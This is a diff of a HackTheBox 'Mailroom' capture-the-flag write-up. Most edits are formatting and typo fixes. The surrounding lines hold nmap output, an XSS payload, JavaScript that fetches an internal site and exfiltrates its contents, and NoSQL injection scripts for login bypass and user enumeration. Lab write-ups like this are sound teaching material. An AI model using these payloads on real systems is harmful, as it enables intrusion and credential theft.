@@ -12,8 +12,6 @@ summary: "Mailroom is a hard linux box vulnerable to multiple vulnerabilities in
 
 ---
 
-> **Executive Summary**
-
 > The contact us page on the site is vulnerable to XXS, which gives access to an internal website that is vulnerable to NoSQLi and exfil the passwords of valid users. Using command injection gives a shell on the docker container. The container has credentials for another user on the machine, with which we see a user using kpcli to interact with a KeePass database. Using strace to dump the database's master password found credentials for other users, including root.
 
 ---
@@ -24,28 +22,32 @@ summary: "Mailroom is a hard linux box vulnerable to multiple vulnerabilities in
 
 ### Open Ports
 
+Found 2 open ports using nmap,
+
 -   port 22 → SSH
 -   port 80 → Apache web server
 
 Although banners for both services are different, could be because of containerization or virtualization
 
-```bash
+{{< highlight bash "hl_lines=7 12" >}}
+
 nmap -p22,80 -sV -sC -T4 -Pn -oA 10.10.11.209 10.10.11.209
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-17 01:52 EDT
 Nmap scan report for 10.10.11.209
 Host is up (0.057s latency).
 
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey:
-|   3072 94bb2ffcaeb9b182afd789811aa76ce5 (RSA)
-|   256 821beb758b9630cf946e7957d9ddeca7 (ECDSA)
-|_  256 19fb45feb9e4275de5bbf35497dd68cf (ED25519)
-80/tcp open  http    Apache httpd 2.4.54 ((Debian))
-|_http-server-header: Apache/2.4.54 (Debian)
-|_http-title: The Mail Room
+| 3072 94bb2ffcaeb9b182afd789811aa76ce5 (RSA)
+| 256 821beb758b9630cf946e7957d9ddeca7 (ECDSA)
+|\_ 256 19fb45feb9e4275de5bbf35497dd68cf (ED25519)
+80/tcp open http Apache httpd 2.4.54 ((Debian))
+|\_http-server-header: Apache/2.4.54 (Debian)
+|\_http-title: The Mail Room
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-```
+
+{{< /highlight >}}
 
 ### HTTP - mailroom.htb
 
@@ -85,7 +87,7 @@ The link reflects all input fields except the title; however, the `Inquiry statu
 
 ![XXS test](./images/view-contact-form-status.png)
 
-Since the message body is reflected, my very first thought, I XSS! Using a basic XXS payload like `<script>alert('XSS')</script>` in the message field and visiting the link gives a XSS pop up.
+Since the message body is reflected, my very first thought is XSS. Using a basic XXS payload like `<script>alert('XSS')</script>` in the message field and visiting the link gives a XSS pop up.
 
 Since it is vulnerable to XXS, I tried to grab cookies, but neither of these payloads worked
 
@@ -237,7 +239,7 @@ fetch("http://staff-review-panel.mailroom.htb").then((r) =>
 );
 ```
 
-I developed a [small Flask application](https://gist.github.com/AbraXa5/f8f7e0a6caec4c7a5eb6c426a575923b#file-xxs_exfil-py) to automate the decoding process for each reques. Using the payload returns the source for the staff review site.
+I developed a [small Flask application](https://gist.github.com/AbraXa5/f8f7e0a6caec4c7a5eb6c426a575923b#file-xxs_exfil-py) to automate the decoding process for each request. Using the payload returns the source for the staff review site.
 
 ```bash
 > python xss_exfil.py
@@ -342,6 +344,7 @@ Investigating the new `/auth.php` endpoint based on this new info. Given that th
 Modified the previous script to conduct a test for NoSQLi. The main payload here is `email[$ne]=abraxas&password[$ne]=abraxas`. Given the extremely remote possibility of an existing user with these credentials, a positive response from this query will confirm NoSQL injection.
 
 _nosqli.js_
+
 ```js
 // var formData = "email[$exists]=true&password[$exists]=true";
 var formData = "email[$ne]=abraxas&password[$ne]=abraxas";
@@ -389,6 +392,7 @@ Using the same Flask app as before, the decoded text indicates that the request 
 There are actually two JSON responses here, one of which is invalid and the next is successful because the invalid response lacks an exit statement, allowing the remainder code to execute. Testing the three usernames found on the Gitea sitemap. Since the login page needs an email, appending `@mailroom.htb` to the usernames.
 
 _user_enum.js_
+
 ```js
 // var formData = "email[$eq]=administrator@mailroom.htb&password[$exists]=true";
 var formData = "email[$eq]=tristan@mailroom.htb&password[$exists]=true";
